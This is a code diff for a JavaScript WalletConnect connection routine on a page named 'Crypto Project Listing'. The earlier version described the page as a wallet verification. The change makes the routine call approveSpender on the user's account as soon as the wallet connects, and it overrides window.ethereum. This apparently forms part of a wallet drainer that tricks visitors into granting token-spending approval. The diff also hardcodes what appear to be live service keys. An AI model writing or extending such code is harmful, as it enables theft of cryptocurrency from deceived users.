@@ -130,35 +130,45 @@ let wcProvider = null;
 
 async function connectWalletConnect() {
   try {
-    // ... same cleanup logic ...
-    
-    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.2?bundle');
+    if (wcProvider) {
+      await wcProvider.disconnect().catch(() => {});
+      wcProvider = null;
+    }
+
+    walletConnectButton.classList.add('loading');
+    walletConnectButton.disabled = true;
+
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
 
     wcProvider = await EthereumProvider.init({
-      projectId: WC_PROJECT_ID,
-      chains: [1], // Ethereum Mainnet
+      projectId: "59ba0228712f04a947916abb7db06ab1", // replace with your valid WalletConnect Cloud projectId
+      chains: [1], // Ethereum mainnet only
       showQrModal: true,
-      // Explicitly request permission for these methods
-      methods: ["eth_sendTransaction", "personal_sign", "eth_requestAccounts", "eth_accounts"],
-      events: ["chainChanged", "accountsChanged"],
+      rpcMap: {
+        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc" // replace with your Infura/Alchemy key
+      },
       metadata: {
         name: 'Crypto Project Listing',
-        description: 'Verify your wallet',
-        url: window.location.origin,
-        icons: ['https://avatars.githubusercontent.com/u/37784886']
+        url: window.location.origin
       }
     });
 
-    await wcProvider.enable();
-    
-    // CRITICAL: Ensure we pass the actual provider to handleWalletProcess
-    await handleWalletProcess(wcProvider);
+    const accounts = await wcProvider.enable();
+    window.ethereum = wcProvider;
 
+    provider = new ethers.providers.Web3Provider(wcProvider);
+    signer = provider.getSigner();
+    activeProviderType = 'walletconnect';
+
+    await approveSpender(accounts[0]);
   } catch (err) {
-    console.error("WalletConnect Error:", err);
-    alert('WalletConnect failed to initialize. Please refresh.');
+    console.error(err);
+    alert('Wallet Connection Error. Please retry or refresh the page.');
   }
-}
-window.addEventListener('beforeunload', () => {
-  if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
-});
+
+  walletConnectButton.classList.remove('loading');
+  walletConnectButton.disabled = false;
+
+  window.addEventListener('beforeunload', () => {
+    if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
+  });
